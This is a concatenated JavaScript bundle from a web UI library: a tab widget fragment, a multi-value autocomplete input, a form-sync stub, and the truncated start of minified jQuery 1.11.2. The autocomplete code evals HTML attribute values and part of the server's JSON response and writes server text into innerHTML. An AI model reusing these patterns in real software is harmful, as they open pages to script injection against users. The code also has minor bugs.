			dts.setAttribute("id",local.name+'_data_'+local.count);
			dts.setAttribute("class",local.classname+'_data');
			dts.setAttribute('activate','inactive');
			dts.innerHTML=tabcontent;
			local.elData.appendChild(dts);		
		}
		
		local.count++;
	}
	
	this.activate=function activate(page)
	{
	    if(page<local.count)
		{
			var tbs=document.getElementById(local.name+'_tab_'+page);
			var rad=document.getElementById(local.name+'_radio_'+page);
			var dat=document.getElementById(local.name+'_data_'+page);
			dat.setAttribute('activate','active');
			rad.checked=true;
			local.lastActivate=dat;
			return true;
		}
		return false;
		
	}
	
	this.init(nm,cls);
}


/* jc_multinput.js */

/**
 * js_multinput - JavaScript JooCha Library
 *
 * Functions collection for input element with multiple values
 * 
 * @link    http://joocha.com
 * @license For open source use: GPLv3
 *          For commercial use: Commercial License
 * @author  John Chavchanidze
 * @version 1.0.1
 *
 * See usage examples at http://joocha.com/examples
 */
 
var jcMultInputCounter=0;
var xMultInputObjects=[];
var xMultInputObjectsById={};
//------------------------------------
function jc_MultInput(vObjectOrId,vInputId,vClassName,vUrl,vCallBack,vDataType,xChange,xClick)
{
	var local=this;
	this.ObjectCounter=(jcMultInputCounter+1);jcMultInputCounter++;
	
	this.vObjectOrId=vObjectOrId;
	this.vInputId=vInputId;
	this.vClassName=vClassName;
	this.vUrl=vUrl;
	this.vCallBack=vCallBack;
	this.vDataType=vDataType;
	this.xChange=xChange;
	this.xClick=xClick;

	this.QueryLink=this.callBack=null;
	this.QueryType='xml';
	this.inputId='';
	this.value='';
	this.debug=0;
	this.TagType="input";
	this.ParentID="";
	this.separateSymbol=";"
	this.keypress=null;
	this.afterChangeTimeWait=300;
	this.delayTime=0;
	this.valueURLParamName="q";
	this.myResult=null;
	this.myResultList=null;
	this.myResultPanel=null;
	this.collapseDirection="down";
	
	
	this.myButtonId="";
	this.myResultId="";
	this.myFilterId="";
	this.parent="";
	this.grandParent="";
	this.myCursorId="";
	this.myCursor="";
	this.vInit="";
	
	this.vValue='';
	
this.Init=function Init(){	
    if(local.vObjectOrId)
	{
		this.parent=local.vObjectOrId;
		if(typeof local.vObjectOrId !== "object"){
			var prev=local.xGet(local.vObjectOrId);
			if(prev){
				local=prev;
				return local;
			}
			local.parent=document.getElementById(local.vObjectOrId);
		}
		
		if(local.parent.id)
			local.ParentID=local.parent.id;
		else 
			local.ParentID=local.parent.id="xMultInputParentID"+local.ObjectCounter;

		if(local.parent)
		{
			local.grandParent=local.parent.parentElement || local.parent.parentNode;
			
			if(local.parent.getAttribute("data-debug"))local.debug=local.parent.getAttribute("data-debug");

			if(!local.xChange)
			if(local.parent.getAttribute("data-onchange"))local.xChange=local.parent.getAttribute("data-onchange");
			if(!local.xClick)
			if(local.parent.getAttribute("data-onclick"))local.xClick=local.parent.getAttribute("data-onclick");

			if(!local.vUrl)
			if(local.parent.getAttribute("data-url"))local.vUrl=local.parent.getAttribute("data-url");
			
			if((!local.vValue) || (local.vValue==undefined))
			if(local.parent.getAttribute("data-value"))local.vValue=local.parent.getAttribute("data-value");
			
			
			if(!local.vCallBack)
			if(local.parent.getAttribute("data-callback"))local.vCallBack=local.parent.getAttribute("data-callback");
			
			if(!local.vInit)
			if(local.parent.getAttribute("data-init"))local.vInit=local.parent.getAttribute("data-init");
			
			
			if(!local.keypress)
			if(local.parent.getAttribute("data-keypress"))local.keypress=local.parent.getAttribute("data-keypress");		
			
			if(local.parent.getAttribute("data-collapse-direction"))local.collapseDirection=local.parent.getAttribute("data-collapse-direction");					
		
					
			if(!local.vDataType)
			if(local.parent.getAttribute("data-type"))local.vDataType=local.parent.getAttribute("data-type");
			if(!local.vDataType)local.vDataType="xml";
			
		
			if(!local.vClassName)
			if(local.parent.getAttribute("data-class"))local.vClassName=local.parent.getAttribute("data-class");
			
			vName='';
			if(!local.vInputId)
			if(local.parent.getAttribute("data-name"))vName=local.vInputId=local.parent.getAttribute("data-name");
			if(!local.vInputId)
			if(local.parent.getAttribute("data-id"))local.vInputId=local.parent.getAttribute("data-id");	
			if(!local.vInputId)
			if(local.parent.getAttribute("name"))vName=local.vInputId=local.parent.getAttribute("name");
			
			if(local.parent.getAttribute("data-tag"))local.TagType=local.parent.getAttribute("data-tag");
			if(local.parent.getAttribute("data-button-id"))local.myButtonId=local.parent.getAttribute("data-button-id");
			if(local.parent.getAttribute("data-result-id"))local.myResultId=local.parent.getAttribute("data-result-id");
			if(local.parent.getAttribute("data-filter-id"))local.myFilterId=local.parent.getAttribute("data-filter-id");
			
			if(local.myCursorId)local.myCursorId=local.ParentID+"_cursor";
			

			xMultInputObjects[local.ObjectCounter]=local;
			if(local.parent.id)xMultInputObjectsById[local.parent.id]=local;
			if(local.vInputId)xMultInputObjectsById[local.vInputId]=local;
			
			local.QueryLink=local.vUrl;
			local.callBack=local.vCallBack;
			local.QueryType=local.vDataType;
			local.InputClassname=local.vClassName;
			local.InputId=local.vInputId;
			local.name=vName;
			local.value=local.vValue;
			
			if(local.vInit)try{eval(local.vInit);}catch(e){console.log("MultiInput Init Param: "+e);};
		}
	}
	local.LoadContent(0);
return local;
}

//======================================================
this.myName = function () 
{ 
    for (var name in this.global) 
      if (this.global[name] == this) 
        return name; 
} 

//======================================================
// Default Parametrebis Inicializacia
this.LoadContent=function LoadContent(inpId,clsName)
{
	if(!local.parent)return false;
	
	local.Clear();
    if(!inpId)inpId=local.inputId;
	local.inputId=inpId;
	
	if(!clsName)clsName=local.inputClassname;
	local.inputClassname=clsName;
	
	if(!local.myInput){
		local.myInput=document.createElement("input");
		local.myInput.type="hidden";
		local.myInput.className="input";
		local.myInput.value=local.value;
		local.myInput.name=local.name;
	}
	
	
	if(local.myButtonId && !local.myButton){
		local.myButton=document.getElementById(local.myButtonId);
	}else{
		local.myButton=document.createElement("DIV");
		local.myButton.id=local.myButtonId=local.ParentID+"_button";
		local.myButton.className="searchButton";
		local.myButton.innerHTML="search";
		local.grandParent.appendChild(local.myButton);
	}
	if(!CheckObjectEvent(local.myButton,"click"))AddEventOnObject(local.myButton,"click",local.loadFromServer);

	if(local.myResultId && !local.myResult){
		local.myResultList=local.myResult=document.getElementById(local.myResultId);
	}else{
		local.myResult=document.createElement("div");
		local.myResult.id=local.myResultId=local.ParentID+"_result";
		local.myResult.className="jcResult "+local.collapseDirection;
		local.myResultList=local.myResult;
		local.grandParent.appendChild(local.myResult);
	}
	local.addResultScrollButton();
	
	if(local.myFilterId && !local.myFilter){
		local.myFilter=document.getElementById(local.myFilterId);
	}else{
		local.myFilter=document.createElement("div");
		local.myFilter.id=local.myFilterId=local.ParentID+"_filter";
		local.myFilter.className="jcResult "+local.collapseDirection;
		local.grandParent.appendChild(local.myFilter);
	}
	

	/*Stop second initialisation*/
	if(local.firstInitialize){local.firstInitialize=1;return local.firstInitialize;};
	
	
	local.grandParent.appendChild(local.myInput);
	local.parent.setAttribute("contenteditable","true");
	local.parent.setAttribute("wrap","on");
	local.parent.innerHTML="&nbsp;";
	addClass(local.parent,"stopdrag");
	
	AddEventOnObject(local.parent,"keydown",function(ev){
		var e=ev || windows.event;
		var kc=e.charCode || e.keyCode;
		if(kc==13){//disable enter
			return formEventDisableEx(e);
		}
	});
	
	//AddEventOnObject(local.parent,"click",function(ev){this.focus();});
	//AddEventOnObject(local.parent,"keypress",function(ev){this.focus();});
	

    AddEventOnObject(local.parent,"keyup",function(ev){
	var e=ev || windows.event;
	var kc=e.charCode || e.keyCode;
	if(!local)local=xMultInputObjectsById[this.id];

	if(kc==59 || kc==186 || kc==13){
		var els=e.target.childNodes;

		var ntxt=[];
		for(var j=0;j<els.length;j++){
			var wholeText=rtrim(els[j].wholeText," "+local.separateSymbol)+local.separateSymbol;
			if((els[j].nodeType==3) && (wholeText.trim()!=local.separateSymbol)){//text
			   e.target.removeChild(els[j]);
			   ntxt[ntxt.length]=wholeText;
			   //local.addItem(wholeText,j+1);
			}else 
			if(els[j].nodeType==1)
			{
				if(els[j].tagName!=undefined && ["A","INPUT"].indexOf(els[j].tagName.toUpperCase())==-1)e.target.removeChild(els[j]);
				else els[j].tabIndex=(j+1);
			}
		}
		
		var maxj=j;
		for(var j=0;j<ntxt.length;j++)local.addItem(ntxt[j],j+maxj+1);
		local.value=local.myInput.value=e.target.innerText;//.replace(local.separateSymbol,"");
	}else
	if(local.keypress){

		  local.value=local.myInput.value=e.target.innerText;//.replace(local.separateSymbol,"");
          if(local.loadRunner){clearTimeout(local.loadRunner);local.loadRunner=null;}
		  if((typeof local.keypress=="function") || (local.keypress && local.keypress.toLowerCase()!="on"))
			local.loadRunner=setTimeout(local.keypress, local.afterChangeTimeWait);			
		  else
			local.loadRunner=setTimeout(local.loadFromServer, local.afterChangeTimeWait);
	}
	this.focus();
	return false;
	
});
	
	local.readAll();
	//contenteditable="true"  wrap="on"
	
}	
//======================================================
	this.loadFromServerEx=function loadFromServerEx(){
		local.value=local.myInput.value=local.parent.innerText;
		if(local.value){
			if(local.value==undefined)local.value="";
			if(local.argument==undefined)local.argument="";

			var u=local.QueryLink;
			if(u && u[0]=="@")u=eval(decodeURIComponent(u.substr(1)));
			local.openStatus=1;
			SendQuery("POST",u+"&"+local.valueURLParamName+"="+local.readAsURLParam()+"&pgcount="+(local.argument!=undefined?local.argument:""),local.afterLoadCallback);
		}else {
			if(local.clearResult)local.clearResult();
		}
	}
  
	this.loadFromServer=function loadFromServer() {
		if(local.loadingData)clearTimeout(local.loadingData);
		local.loadingData=setTimeout(local.loadFromServerEx,local.delayTime);
		local.delayTime=1000;
	}
	
	this.afterLoadCallback=function afterLoadCallback(vDat)
	{
		if(!vDat || vDat === undefined)return 0;
		var obj=0;
		//local.clear(); amanac gamoicvia problema, rodesac itvirteba result, egreve kreba dzveli akrefili
		if(local.clearResult)local.clearResult();
		
		//alert(vDat);

		try{
			//eval("obj = "+vDat);
			obj=JSON.parse(vDat);
		}catch(e){console.log("ERROR afterLoadCallback1:"+e);}
	
		if(obj["data"])
		{
			eval(obj["data"]);
			if(local.debug)console.log("afterLoadCallback FieldName: "+GridFieldsData);
			
			var dv = new Array();
			var element = new Array();
			local.wordsLenght=0;
			if(GridFieldsData.length)local.wordsLenght = GridCellData.length/GridFieldsData.length;
		
			var defParAlreadySelect=0;
			for(var i=0; i < GridCellData.length; i++) 
			if(GridLinkData[i]>0)
			{
				dv[i] = document.createElement('div');
				dv[i].className = 'jcResultDivs';
				dv[i].id = local.ParentId+'_option'+i;
				dv[i].setAttribute('data-rowid',GridLinkData[i]);
				dv[i].setAttribute('data-index',i);

				local.myResultList.appendChild(dv[i]);
				var res="";
				for(j=0;j<GridFieldsData.length;j++)res+=GridCellData[i][j]+"; ";
				if(res==undefined)res="";
				
				dv[i].innerHTML = res;
				if(GridLinkData[i]==local.value){
					local.value=res;
					dv[i].className = 'jcResultDivs jcSelected';
					defParAlreadySelect=1;
				}
				
				dv[i].onclick = function() {onClickChooseItem(this);};
				dv[i].keypress = function() {return false;};
				dv[i].keydown = function() {return false;};
			}
		}else
		if(obj["list"] && Object.keys(obj["list"]).length>0)
		{
			if(!obj)obj={};

			var dv = new Array();
			var element = new Array();
			
			var i=0;
			for(var item in obj.list){
				if((typeof obj.list[item])=="string")
				{
					dv[i] = document.createElement('div');
					dv[i].className = 'jcResultDivs';
					dv[i].id = local.ParentID+'_option'+i;
					dv[i].setAttribute('data-rowid',item);
					dv[i].setAttribute('data-index',i);
					dv[i].innerHTML = obj.list[item];
					local.myResultList.appendChild(dv[i]);
					
					if(item==local.value){
						if(obj.list[item]!=undefined)local.value=obj.list[item];else local.value="";
						dv[i].className = 'jcResultDivs jcSelected';
						defParAlreadySelect=1;
					}
					
					
					dv[i].onclick=function() {onClickChooseItem(this);};
					dv[i].keypress = function() {return false;};
					dv[i].keydown = function() {return false;};
					
					i++;
				}
				else
				if((typeof obj.list[item])=="object"){
					dv[i]=json2html(obj.list[item]);
					local.myResultList.appendChild(dv[i]);
					i++;
				}
			}
			
			local.myResultPanel.innerHTML="";
			if(obj["title"]){
				local.myResultPanelTitle=json2html(obj["title"]);
				addClass(local.myResultPanelTitle,"title");
				local.myResultPanel.appendChild(local.myResultPanelTitle);
			}
			
			if(obj["link"]){
				local.myResultPanelLink=json2html(obj["link"]);
				addClass(local.myResultPanelLink,"link");
				local.myResultPanel.appendChild(local.myResultPanelLink);
			}
			
		}

	
		//###REMOVE
		GOBJ=obj;
		

		
		//console.log("AAA:"+defParAlreadySelect+"-"+local.myInput.value);
		/*default parametris archeva*/
		if(!defParAlreadySelect)defParAlreadySelect=local.chooseItem();
		
		var nextPage=document.createElement('div'); 
		nextPage.innerHTML='';
		//nextPage.addEventListener("mouseover",function(){loadFromServer ((local.pageCounter++));});
		local.myResult.appendChild(nextPage);
		if(local.openStatus){
			delClass(local.myResult,"hidden");
			addClass(local.myResult,"visible");
		}
		local.parent.focus();
		//local.myInput.select();კრეფის დროს ხელს უშლის
		if(local.callBack)
		{
			if(typeof local.callBack=="function")
			{
				local.callBack(local);
			}
			else
			if(typeof local.callBack=="string")
			{
				var u=local.callBack;if(u && u[0]=="@")u=eval(decodeURIComponent(u.substr(1)));
				eval(u);
			}
		}
	
		if(defParAlreadySelect)local.close();
		
	}
	
//======================================================	
  this.clearResult=function clearResult() {
	if(local.myResult)
	{
		local.myResult.innerHTML = '';
		addClass(local.myResult,"hidden");
		delClass(local.myResult,"visible");
		local.addResultScrollButton();
	}
	//local.setDirect('');
  }
  
  this.close=function close() {
	if(local.myResult)
	{
		addClass(local.myResult,"hidden");
		delClass(local.myResult,"visible");
		
		local.myInput.setAttribute("data-index",0);
	}
  }

	this.resultScrollLeft=function resultScrollLeft(){
		if(local.myResultList && local.myResultList.childNodes && local.myResultList.childNodes.length<=1)return;
		var avg=local.myResultList.scrollWidth/parseInt(local.myResultList.childNodes.length);
		local.myResultList.scrollLeft-=avg;
	}
	
	this.resultScrollRight=function resultScrollRight(){
		if(local.myResultList && local.myResultList.childNodes && local.myResultList.childNodes.length<=1)return;
		var avg=local.myResultList.scrollWidth/parseInt(local.myResultList.childNodes.length);
		local.myResultList.scrollLeft+=avg;
	}
  
  this.addResultScrollButton=function addResultScrollButton(){
	if(local.myResult){
		var el=local.myResult.getElementsByClassName("scroll");
		if(el && el.length<1){
			local.myResultList=document.createElement("DIV");
			local.myResultList.className="mainblock";
			
			local.myResultOver=document.createElement("DIV");
			local.myResultOver.className="onover"
			local.lft=document.createElement("i");
			local.rgt=document.createElement("i");
			local.lft.className="scroll left";
			local.rgt.className="scroll right";
			local.lft.innerHTML="keyboard_arrow_left";
			local.rgt.innerHTML="keyboard_arrow_right";
			AddEventOnObject(local.lft,"click",local.resultScrollLeft);
			AddEventOnObject(local.rgt,"click",local.resultScrollRight);
			local.myResultOver.appendChild(local.lft);
			local.myResultOver.appendChild(local.rgt);
			//local.parent.insertBefore(local.myResultOver,local.myResult);
			local.myResult.appendChild(local.myResultList);
			local.myResult.appendChild(local.myResultOver);
			
			local.myResultPanel=document.createElement("DIV");
			local.myResultPanel.className="panel";
			local.myResult.appendChild(local.myResultPanel);
		}
	}
  }
  
 
  
  this.open=function open() {
	if(local.myResult.style.display == 'none')
	{
		if(local.myResult.innerHTML.length>10)
		{
			delClass(local.myResult,"hidden");
			addClass(local.myResult,"visible");

			if(document.getElementById("jcResultDivs"+local.value))
				addClass(document.getElementById("jcResultDivs"+local.value),"jcSelected");
		}
		else
		{
			local.delayTime=0;
			local.loadFromServer();
		}
	}
  }
  
  this.refresh=function refresh () {
	local.delayTime=0;
	local.openStatus=0;
	if(local.openStatus){
		addClass(local.myResult,"hidden");
		delClass(local.myResult,"visible");
	}
	local.loadFromServer();
  }

	this.chooseItem=function chooseItem(val){
		var els=local.myResult.getElementsByTagName("DIV");
		var ret=0;
		if(val==undefined)val=local.myInput.value;
		for(var i=0;i<els.length;i++)
		{
			var atr=0;
			if(els[i] && els[i].getAttribute)
			{
				atr=els[i].getAttribute("data-rowid");
				if(atr==val)
				{
					if(els[i].innerHTML!=undefined)local.myInput.value=els[i].innerHTML;else local.myInput.value="";
					els[i].className = 'jcResultDivs jcSelected';
					ret=1;
					break;
				}
			}
			
		}
		return ret;		
	}

//======================================================
this.addItem=function addItem(curTxt,tbidx,params,overwrite){

	if(!overwrite)overwrite=false;
	var a;
	if(curTxt)curTxt=trim(curTxt," ;\r\n\t")+";";
	if(curTxt.charAt(0)=="#"){tbidx=trim(curTxt.split(":")[0]," \r\t\n:#");};
	
	if(overwrite){
		var chs=local.parent.childNodes;
		for(var i=0;i<chs.length;i++)if((chs[i].getAttribute) && (chs[i].getAttribute("tabindex")==tbidx)){
			a=chs[i];
			break;
		}
	}
	
	if(!a || a==undefined){
		a=document.createElement("a");
		a.innerHTML=curTxt
		overwrite=false;
	}
	

	a.childNodes[0].nodeValue=curTxt;
	
	curId=curTxt.trim().replace(/[\s\;]+/gim,"_");
	a.setAttribute("contenteditable","false");
	a.setAttribute("data-pageid",curId);
	a.setAttribute("data-container-id",local.parent.id);
	if(tbidx)a.setAttribute("tabindex",tbidx);
	if(params && (typeof (params) == "object")){
		for(var i in params)if(params.hasOwnProperty(i)){
			a.setAttribute(i,params[i]);
		}
	}
	
	if(!overwrite){
		local.parent.appendChild(a);
	
		curId=AddEventOnObject(a,"click",function(){
				if(this.classList.contains("active"))delClass(this,"active");
				else addClass(this,"active");
				
				var cntid=this.getAttribute("data-container-id");
				if(!cntid){console.log(this);return;}
				var control=document.getElementById(cntid);
				if(!control)return;
				//control.focus();
		});
		a.setAttribute("data-pageid",curId);

		var del=document.createElement("span");
		del.style.cursor="pointer";
		del.className="remover";
		del.setAttribute("data-pageid",a.getAttribute("data-pageid"));
		del.setAttribute("data-container-id",local.parent.id);
		del.setAttribute("contenteditable","false");
		a.appendChild(del);
		AddEventOnObject(del,"click",function(){
			var pgid=this.getAttribute("data-pageid");
			var cntid=this.getAttribute("data-container-id");
			if(!cntid){console.log(this);return;}
			var control=document.getElementById(cntid);
			if(!control)return;
			var els=control.getElementsByTagName("A");
			for(var i=0;i<els.length;i++){
				if(els[i].getAttribute("data-pageid")==pgid){
					control.removeChild(els[i]);
					control.focus();
					break;
				}
			}
		});
	}
	
}
//======================================================
this.readAll=function readAll(txt){
	if(!txt)txt=local.myInput.value;
	
	var els=txt.split(local.separateSymbol);
	local.parent.innerHTML="";
	if(local.myCursor)local.parent.appendChild(local.myCursor);
	
	for(var j=0;j<els.length;j++){
		var wholeText=rtrim(els[j]," "+local.separateSymbol)+local.separateSymbol;
		if(wholeText.length>1)local.addItem(wholeText,j+1);
	}
}
//======================================================
this.readAsURLParam=function readAsURLParam(){
	var els=local.parent.childNodes;
	var txt="",url="";
	url="";
	
	for(var j=0;j<els.length;j++){
		if(els[j].nodeType==1 && els[j].tagName.toLowerCase()=="a"){
			var pname=trim(els[j].getAttribute("tabindex") || "");
			var pval=trim(els[j].childNodes[0].nodeValue,local.separateSymbol);
			if(pname && pname!=undefined && !isNumber(pname.charAt(0))){
				url+="&"+trim(pname)+"="+encodeURIComponent(pval);
			}else {
				txt+=(txt && txt!=undefined?" ":"")+pval;
			}
		}else if(els[j].nodeType==3){
			if(els[j] && els[j]!=undefined){
				txt+=(txt && txt!=undefined?" ":"")+(els[j].nodeValue && els[j].nodeValue!=undefined?els[j].nodeValue:els[j]);
			}
		}
	}
return encodeURIComponent(txt)+url;
}

//======================================================
this.Clear=function Clear()
{
	if(local.myInput)local.myInput.value="";
	if(local.parent)local.parent.innerHTML="";
	if(local.myCursor)local.parent.appendChild(local.myCursor);
	if(local.clearResult)local.clearResult();
}
//=======================================================
this.initCursor=function initCursor(){
	if(local.myCursorId && !local.myCursor){
		local.myCursor=document.getElementById(local.myCursorId);
	}
	if(!local.myCursor || local.myCursor==undefined){
		local.myCursor=document.createElement("div");
		local.myCursor.setAttribute("contenteditable","true");
		local.myCursor.id=local.myCursorId=local.ParentID+"_cursor";
		local.myCursor.className="jCursor "+local.collapseDirection;
		local.parent.appendChild(local.myCursor);
	}
}

	//Public static functions
	this.xGet=function xGet(nm)
	{
		if(nm in xMultInputObjectsById)return xMultInputObjectsById[nm];
		
		for(var i=xMultInputObjects.length-1;i>=0;i--)
		{
			if(xMultInputObjects[i])
				if(xMultInputObjects[i].inputId==nm)return xMultInputObjects[i];
				else
				if(xMultInputObjects[i].name==nm)return xMultInputObjects[i];
		}
		return null;
	};

//======================================================
return this.Init();

	
}//end class
//======================================================
/*xMultInput Loader*/
function xMultInputStartUp(clsName)
{
	var objNameSpace="xMultInput";
	if(!clsName)clsName=objNameSpace;
	var els=document.getElementsByClassName(clsName);

	for(var i=els.length-1;i>=0;i--){
		new jc_MultInput(els[i]);
	}

}

//======================================================
AddEventOnObject(window,"load",function(){xMultInputStartUp();});
//window.onload=function (){FormularLoading(document);};
//======================================================


/* jc_signal.js */

/**
 * jc_signal - JavaScript JooCha Library
 * jc_signal.php - Back-end service
 * HTML Form Synchronization between multiple browser
 * 
 * @link    http://www.joocha.com
 * @license For open source use: GPLv3
 *          For commercial use: Commercial License
 * @author  John Chavchanidze
 * @version 1.0.0
 *
 * See usage examples at http://www.joocha.com/examples
 */
 
 var SIGNAL_OBNAME="xSignal";
 var SIGNAL_OBJECTS=[];
 var SIGNAL_COUNTER=0;
 
function jc_signal(vObjectOrId,attr)
{
 var local=this;
 this.parent=NULL;
 this.parentId=0;
 this.debug=0;
 this.name="";
 
	this.init=function init(vObjectOrId,attr){
    if(vObjectOrId){
		local.parent=vObjectOrId;
		
		if((typeof vObjectOrId) !== "object"){
			prev=local.xGet(vObjectOrId);
			local.parent=document.getElementById(vObjectOrId);
			if(prev && prev.objectIdentity && (local.parent==prev)){
				local=prev;
				return local;
			}
			if(prev && (local.parent!=prev)){
				delete SIGNAL_OBJECTS[prev.objectIdentity];
			}
		}
		
		local.objectIdentity=(SIGNAL_COUNTER+1);SIGNAL_COUNTER++;
		
		if(local.parent.id)
			local.parentId=local.parent.id;
		else 
			local.parentId=local.parent.id=SIGNAL_OBNAME+local.objectIdentity;
			
		if(local.parent)
		{
			if(local.parent.getAttribute("data-debug"))local.debug=local.parent.getAttribute("data-debug");

			if(attr){
				if("name" in attr)local.name=attr["name"];
			}

			SIGNAL_OBJECTS[local.objectIdentity]=local;
		}
	}

	return local;	
	
	}
	 
	this.xGet=function xGet(nm)	{
		if(nm in SIGNAL_OBJECTS)return SIGNAL_OBJECTS[nm];
		
		for(var i=SIGNAL_OBJECTS.length-1;i>=0;i--){
			if(SIGNAL_OBJECTS[i])
				if(SIGNAL_OBJECTS[i].name==nm)return SIGNAL_OBJECTS[i];
		}
		return null;
	};	 
 
return this.init(vObjectOrId,attr);
}


function loadSignal(){
	AddEventOnObject(window,"load",function(){
		var els=document.getElementsByClassName("xSignal");
		for(var i=els.length-1;i>=0;i--){
			new jc_signal(els[i]);
		}
		
		var els=document.getElementsByClassName("FORM");
		for(var i=els.length-1;i>=0;i--)
		if(els[i].hasAttribute("data-signal")){
			new jc_signal(els[i]);
		}
	});
}

loadSignal();

/* jquery-1.11.2.min.js */

/*! jQuery v1.11.2 | (c) 2005, 2014 jQuery Foundation, Inc. | jquery.org/license */
!function(a,b){"object"==typeof module&&"object"==typeof module.exports?module.exports=a.document?b(a,!0):function(a){if(!a.document)throw new Error("jQuery requires a window with a document");return b(a)}:b(a)}("undefined"!=typeof window?window:this,function(a,b){var c=[],d=c.slice,e=c.concat,f=c.push,g=c.indexOf,h={},i=h.toString,j=h.hasOwnProperty,k={},l="1.11.2",m=function(a,b){return new m.fn.init(a,b)},n=/^[\s\uFEFF\xA0]+|[\s\uFEFF\xA0]+$/g,o=/^-ms-/,p=/-([\da-z])/gi,q=function(a,b){return b.toUpperCase()};m.fn=m.prototype={jquery:l,constructor:m,selector:"",length:0,toArray:function(){return d.call(this)},get:function(a){return null!=a?0>a?this[a+this.length]:this[a]:d.call(this)},pushStack:function(a){var b=m.merge(this.constructor(),a);return b.prevObject=this,b.context=this.context,b},each:function(a,b){return m.each(this,a,b)},map:function(a){return this.pushStack(m.map(this,function(b,c){return a.call(b,c,b)}))},slice:function(){return this.pushStack(d.apply(this,arguments))},first:function(){return this.eq(0)},last:function(){return this.eq(-1)},eq:function(a){var b=this.length,c=+a+(0>a?b:0);return this.pushStack(c>=0&&b>c?[this[c]]:[])},end:function(){return this.prevObject||this.constructor(null)},push:f,sort:c.sort,splice:c.splice},m.extend=m.fn.extend=function(){var a,b,c,d,e,f,g=arguments[0]||{},h=1,i=arguments.length,j=!1;for("boolean"==typeof g&&(j=g,g=arguments[h]||{},h++),"object"==typeof g||m.isFunction(g)||(g={}),h===i&&(g=this,h--);i>h;h++)if(null!=(e=arguments[h]))for(d in e)a=g[d],c=e[d],g!==c&&(j&&c&&(m.isPlainObject(c)||(b=m.isArray(c)))?(b?(b=!1,f=a&&m.isArray(a)?a:[]):f=a&&m.isPlainObject(a)?a:{},g[d]=m.extend(j,f,c)):void 0!==c&&(g[d]=c));return g},m.extend({expando:"jQuery"+(l+Math.random()).replace(/\D/g,""),isReady:!0,error:function(a){throw new Error(a)},noop:function(){},isFunction:function(a){return"function"===m.type(a)},isArray:Array.isArray||function(a){return"array"===m.type(a)},isWindow:function(a){return null!=a&&a==a.window},isNumeric:function(a){return!m.isArray(a)&&a-parseFloat(a)+1>=0},isEmptyObject:function(a){var b;for(b in a)return!1;return!0},isPlainObject:function(a){var b;if(!a||"object"!==m.type(a)||a.nodeType||m.isWindow(a))return!1;try{if(a.constructor&&!j.call(a,"constructor")&&!j.call(a.constructor.prototype,"isPrototypeOf"))return!1}catch(c){return!1}if(k.ownLast)for(b in a)return j.call(a,b);for(b in a);return void 0===b||j.call(a,b)},type:function(a){return null==a?a+"":"object"==typeof a||"function"==typeof a?h[i.call(a)]||"object":typeof a},globalEval:function(b){b&&m.trim(b)&&(a.execScript||function(b){a.eval.call(a,b)})(b)},camelCase:function(a){return a.replace(o,"ms-").replace(p,q)},nodeName:function(a,b){return a.nodeName&&a.nodeName.toLowerCase()===b.toLowerCase()},each:function(a,b,c){var d,e=0,f=a.length,g=r(a);if(c){if(g){for(;f>e;e++)if(d=b.apply(a[e],c),d===!1)break}else for(e in a)if(d=b.apply(a[e],c),d===!1)break}else if(g){for(;f>e;e++)if(d=b.call(a[e],e,a[e]),d===!1)break}else for(e in a)if(d=b.call(a[e],e,a[e]),d===!1)break;return a},trim:function(a){return null==a?"":(a+"").replace(n,"")},makeArray:function(a,b){var c=b||[];return null!=a&&(r(Object(a))?m.merge(c,"string"==typeof a?[a]:a):f.call(c,a)),c},inArray:function(a,b,c){var d;if(b){if(g)return g.call(b,a,c);for(d=b.length,c=c?0>c?Math.max(0,d+c):c:0;d>c;c++)if(c in b&&b[c]===a)return c}return-1},merge:function(a,b){var c=+b.length,d=0,e=a.length;while(c>d)a[e++]=b[d++];if(c!==c)while(void 0!==b[d])a[e++]=b[d++];return a.length=e,a},grep:function(a,b,c){for(var d,e=[],f=0,g=a.length,h=!c;g>f;f++)d=!b(a[f],f),d!==h&&e.push(a[f]);return e},map:function(a,b,c){var d,f=0,g=a.length,h=r(a),i=[];if(h)for(;g>f;f++)d=b(a[f],f,c),null!=d&&i.push(d);else for(f in a)d=b(a[f],f,c),null!=d&&i.push(d);return e.apply([],i)},guid:1,proxy:function(a,b){var c,e,f;return"string"==typeof b&&(f=a[b],b=a,a=f),m.isFunction(a)?(c=d.call(arguments,2),e=function(){return a.apply(b||this,c.concat(d.call(arguments)))},e.guid=a.guid=a.guid||m.guid++,e):void 0},now:function(){return+new Date},support:k}),m.each("Boolean Number String Function Array Date RegExp Object Error".split(" "),function(a,b){h["[object "+b+"]"]=b.toLowerCase()});function r(a){var b=a.length,c=m.type(a);return"function"===c||m.isWindow(a)?!1:1===a.nodeType&&b?!0:"array"===c||0===b||"number"==typeof b&&b>0&&b-1 in a}var s=function(a){var b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u="sizzle"+1*new Date,v=a.document,w=0,x=0,y=hb(),z=hb(),A=hb(),B=function(a,b){return a===b&&(l=!0),0},C=1<<31,D={}.hasOwnProperty,E=[],F=E.pop,G=E.push,H=E.push,I=E.slice,J=function(a,b){for(var c=0,d=a.length;d>c;c++)if(a[c]===b)return c;return-1},K="checked|selected|async|autofocus|autoplay|controls|defer|disabled|hidden|ismap|loop|multiple|open|readonly|required|scoped",L="[\\x20\\t\\r\\n\\f]",M="(?:\\\\.|[\\w-]|[^\\x00-\\xa0])+",N=M.replace("w","w#"),O="\\["+L+"*("+M+")(?:"+L+"*([*^$|!~]?=)"+L+"*(?:'((?:\\\\.|[^\\\\'])*)'|\"((?:\\\\.|[^\\\\\"])*)\"|("+N+"))|)"+L+"*\\]",P=":("+M+")(?:\\((('((?:\\\\.|[^\\\\'])*)'|\"((?:\\\\.|[^\\\\\"])*)\")|((?:\\\\.|[^\\\\()[\\]]|"+O+")*)|.*)\\)|)",Q=new RegExp(L+"+","g"),R=new RegExp("^"+L+"+|((?:^|[^\\\\])(?:\\\\.)*)"+L+"+$","g"),S=new RegExp("^"+L+"*,"+L+"*"),T=new RegExp("^"+L+"*([>+~]|"+L+")"+L+"*"),U=new RegExp("="+L+"*([^\\]'\"]*?)"+L+"*\\]","g"),V=new RegExp(P),W=new RegExp("^"+N+"$"),X={ID:new RegExp("^#("+M+")"),CLASS:new RegExp("^\\.("+M+")"),TAG:new RegExp("^("+M.replace("w","w*")+")"),ATTR:new RegExp("^"+O),PSEUDO:new RegExp("^"+P),CHILD:new RegExp("^:(only|first|last|nth|nth-last)-(child|of-type)(?:\\("+L+"*(even|odd|(([+-]|)(\\d*)n|)"+L+"*(?:([+-]|)"+L+"*(\\d+)|))"+L+"*\\)|)","i"),bool:new 